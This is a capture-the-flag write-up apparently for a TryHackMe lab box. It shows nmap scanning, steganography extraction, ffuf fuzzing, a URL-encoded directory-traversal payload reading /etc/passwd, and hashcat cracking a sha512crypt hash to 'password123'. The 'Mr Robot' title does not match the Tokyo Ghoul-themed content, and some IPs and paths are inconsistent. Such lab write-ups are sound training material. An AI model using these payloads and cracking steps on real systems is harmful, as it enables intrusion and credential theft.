---
author: Manas S
pubDatetime: 2026-1-08T15:22:00Z
modDatetime: 2026-1-08T16:52:45.934Z
title: Mr Robot CTF Writeup
slug: mr-robot
featured: true
draft: true
tags:
    - writeup
    - pwn
description: Write up for the Mr Robot CTF box on tryhackme
ogImage: ../../../assets/images/blogs/robot.webp
---

## Nmap scan

```bash
sudo nmap -sS -sV 10.48.150.251
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-26 22:23 IST
Nmap scan report for 10.48.150.251
Host is up (0.072s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.16 seconds

```


```bash
>steghide extract -sf rize_and_kaneki.jpg
Enter passphrase: 
wrote extracted data to "yougotme.txt".
```
Note: passphrase -> You_found_1t

```bash
> ls
Aogiri_tree.txt  need_to_talk  rize_and_kaneki.jpg  yougotme.txt
```

```bash
> cat yougotme.txt 
haha you are so smart kaneki but can you talk my code 

..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..


if you can talk it allright you got my secret directory 
```

```bash
> ls
Aogiri_tree.txt  need_to_talk  rize_and_kaneki.jpg  yougotme.txt
```

pasting the output to cyberchef and using magic block reveals that it's morse code.

![](http://localhost:8080/uploads/images/gallery/2026-01/scaled-1680-/image-1769447814737.png)

**dir3c70ry_center** is an endpoint on the webserver, which we will examine next

Some more fuzzing on the **d1r3c70ry_center** endpoint to discover some more endpoints

## Using FFUF

```bash
ffuf -u http://10.48.150.251/d1r3c70ry_center/FUZZ -w DirBuster-2007_directory-list-2.3-medium.txt
```

result : endpoint `/claim` is discovered

## lfi

When you land on this page `http://10.48.150.251/d1r3c70ry_center/claim/` you are greeted with the following:

[![](http://localhost:8080/uploads/images/gallery/2026-01/scaled-1680-/image-1769493794817.png)](http://localhost:8080/uploads/images/gallery/2026-01/image-1769493794817.png)

clicking on either no or yes redirects to `/claim/index.php?view=flower.gif`

we then check `view` parameter for file inclusion. first you can simply try, `view=index.php` which leads to the same landing page or earlier, this confirms LFI.

## Directory traversal
try ../../../etc/passwd and its varients

[![](http://localhost:8080/uploads/images/gallery/2026-01/scaled-1680-/image-1769494056605.png)](http://localhost:8080/uploads/images/gallery/2026-01/image-1769494056605.png)

this is probably an error, maybe it allows url encoded paths only. so we try

```url
http://10.49.132.103/d1r3c70ry_center/claim/index.php?view=%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
```
Tada:
[![](http://localhost:8080/uploads/images/gallery/2026-01/scaled-1680-/image-1769494425371.png)](http://localhost:8080/uploads/images/gallery/2026-01/image-1769494425371.png)

## Extract password

```bash

┌─[manas][manas-LOQ-15ARP9][~]
└─▪  sed 's/ /\n/g' users.txt > users_fixed.txt

┌─[manas][manas-LOQ-15ARP9][~]
└─▪  awk -F: '$3 >= 1000 { print $1 ":" $2 }' users_fixed.txt
nobody:x
vagrant:x
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```

the password is a hash, we need to identify it,

```bash
 hashcat --identify kamishiro.hash 
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1800 | sha512crypt $6$, SHA512 (Unix)                             | Operating System

```

```bash
hashcat -m 1800 kamishiro.hash rockyou.txt
```
```bash
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
```